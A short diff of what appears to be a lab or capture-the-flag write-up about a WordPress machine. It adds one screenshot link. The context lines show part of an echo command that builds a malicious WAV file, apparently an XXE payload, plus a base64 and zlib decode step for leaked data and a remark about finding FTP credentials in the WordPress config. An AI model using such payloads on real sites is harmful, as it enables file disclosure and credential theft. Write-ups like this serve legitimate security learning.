@@ -50,6 +50,7 @@ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOC
 ```bash
 echo '<BASE64_DATA>' | base64 --decode | php -r 'echo zlib_decode(file_get_contents("php://stdin"));'
 ```
+![PASSWD2](PASSWD2.png)  
 - Attempting SSH initially failed, so we inspected the WordPress configuration and found the FTP credentials.  
 ![WP_Config1](WP_Config1.png)  
 ![WP_Config2](WP_Config2.png)  
